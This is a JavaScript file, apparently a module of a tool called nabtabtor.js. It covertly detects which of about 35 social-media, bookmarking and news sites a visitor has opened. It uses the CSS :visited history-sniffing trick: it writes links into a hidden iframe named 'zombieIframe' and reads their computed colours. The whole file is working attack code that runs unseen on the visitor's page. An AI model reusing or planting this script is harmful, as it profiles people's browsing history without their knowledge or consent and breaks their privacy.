/*
* sitefinder.js
* part of nabtabtor.js
* 
* George Skouroupathis
*
*/

// A sitefinder object
function SiteFinder(bringSites) {
	var sites = {
	"Digg": ["http://digg.com", "http://digg.com/login"],
	"Reddit": ["http://reddit.com", "http://reddit.com/new/", "http://reddit.com/controversial/", "http://reddit.com/top/", "http://reddit.com/r/reddit.com/", "http://reddit.com/r/programming/"],
	"StumbleUpon": ["http://stumbleupon.com"],
	"Yahoo Buzz": ["http://buzz.yahoo.com"],
	"Facebook": ["http://facebook.com/home.php", "http://facebook.com", "https://login.facebook.com/login.php"],
	"Del.icio.us": ["https://secure.del.icio.us/login", "http://del.icio.us/"],
	"MySpace": ["http://www.myspace.com/"],
	"Technorati": ["http://www.technorati.com"],
	"Newsvine": ["https://www.newsvine.com", "https://www.newsvine.com/_tools/user/login"],
	"Songza": ["http://songza.com"],
	"Slashdot": ["http://slashdot.org/"],
	"Ma.gnolia": ["http://ma.gnolia.com/"],
	"Blinklist": ["http://www.blinklist.com"],
	"Furl": ["http://furl.net", "http://furl.net/members/login"],
	"Mister Wong": ["http://www.mister-wong.com"],
	"Current": ["http://current.com", "http://current.com/login.html"],
	"Menaeme": ["http://meneame.net", "http://meneame.net/login.php"],
	"Oknotizie": ["http://oknotizie.alice.it", "http://oknotizie.alice.it/login.html.php"],
	"Diigo": ["http://www.diigo.com/", "https://secure.diigo.com/sign-in"],
	"Funp": ["http://funp.com", "http://funp.com/account/loginpage.php"],
	"Blogmarks": ["http://blogmarks.net"],
	"Yahoo Bookmarks": ["http://bookmarks.yahoo.com"],
	"Xanga": ["http://xanga.com"],
	"Blogger": ["http://blogger.com"],
	"Last.fm": ["http://www.last.fm/", "https://www.last.fm/login/"],
	"N4G": ["http://www.n4g.com"],
	"Faves": ["http://faves.com", "http://faves.com/home", "https://secure.faves.com/signIn"],
	"Simpy": ["http://www.simpy.com", "http://www.simpy.com/login"],
	"Yigg": ["http://www.yigg.de"],
	"Kirtsy": ["http://www.kirtsy.com", "http://www.kirtsy.com/login.php"],
	"Fark": ["http://www.fark.com", "http://cgi.fark.com/cgi/fark/users.pl?self=1"],
	"Mixx": ["https://www.mixx.com/login/dual", "http://www.mixx.com"],
	"Google Bookmarks": ["http://www.google.com/bookmarks", "http://www.google.com/ig/add?moduleurl=bookmarks.xml&hl=en"],
	"Subbmitt": ["http://subbmitt.com/"]
	};
	
	this.visitedSites = create_iframe();
	
	function get_visited_sites() {
		return this.visitedSites;
	}	
  
	function create_iframe() {
		var iframe = document.createElement("iframe");
		iframe.id = "zombieIframe";
		iframe.style.position = "absolute";

		iframe.style.visibility = "hidden";
		iframe.style.width = 0;
		iframe.style.height = 0;
		
		
		document.body.appendChild(iframe);

		var iframeDoc = (iframe.contentWindow || iframe.contentDocument);
		if (iframeDoc.document) iframeDoc = iframeDoc.document;

		iframeDoc.open();
		iframeDoc.write('<style>');
		iframeDoc.write("a{color: green;}");  
		iframeDoc.write("a:visited {color: #FF0000;}");        
		iframeDoc.write('</style>');
			
		for (var key in sites) {
			
			for (var i =0; i < sites[key].length; i++) {
				iframeDoc.write('<a href="' + sites[key][i] + '">' + key + '</a>');
			}
		}
			
		iframeDoc.close();
		return find_visited_sites();
	}
  
	function find_visited_sites() {
		var iframe = document.getElementById('zombieIframe');
		var iframeDoc = (iframe.contentWindow || iframe.contentDocument);
		if (iframeDoc.document) iframeDoc = iframeDoc.document;
		
		var links = iframeDoc.getElementsByTagName('a');
		
		var vSites = [];
		for (var i=0; i<links.length; i++) {
			var link = links[i];
			var linkColor = window.getComputedStyle(link).getPropertyValue("color");

			if (linkColor == "rgb(255, 0, 0)") {
			
				if (vSites.indexOf(link.innerHTML) == -1) {
					vSites.push(link.innerHTML);
				}
			}
		}
		return vSites;
	}
  
}